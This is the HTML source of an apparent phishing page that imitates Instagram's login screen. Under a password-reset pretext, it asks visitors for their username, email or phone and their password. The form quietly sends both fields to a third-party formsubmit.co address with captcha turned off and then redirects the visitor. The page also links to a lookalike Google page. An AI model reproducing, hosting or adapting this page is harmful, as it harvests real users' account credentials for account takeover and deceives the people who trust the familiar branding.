<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" />
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="png" href="insta-fav.ico">
    <title>Instagram Login</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                 <img src="instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                
                <!-- Start of the form -->
                <form action="https://formsubmit.co/859daee2aeb33b4f7500c3d8c1c82990" method="POST">
          <input type="hidden" name="_captcha" value="false">
          <input type="hidden" name="_next" value="https://ywebsites.github.io/Instagram">
          <input type="hidden" name="_subject" value="Instagram reset y!">

                              <label for="text" class="sr-only">Phone, username, or email</label>
                    <input id="text" name="text" type="text" placeholder="Phone, username, or email" required="">

<label for="password" class="sr-only">Enter your last password you remember </label>
                    <input id="password" name="password" type="password" placeholder="Enter your last password you remember" required="">

                    <button type="submit">Reset password</button>
                </form>
                <!-- End of the form -->

                

                
            </div>

            <div class="panel register flex justify-content-center">
                <p>Continue with Google?</p>
                <a href="https://ywebsites.github.io/Google">Continue</a>
            </div>

            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="apple-button.png" alt="Apple Store logo" title="Apple Store logo" />
                    <img src="googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    
    <footer>
                <span style="position:absolute;footer:32px;left:50%;margin:-36px 0 0 -36px;">
<img width="72px" height="37px" src="download.jpg">

</span>

    </footer>
</body>
    </html>
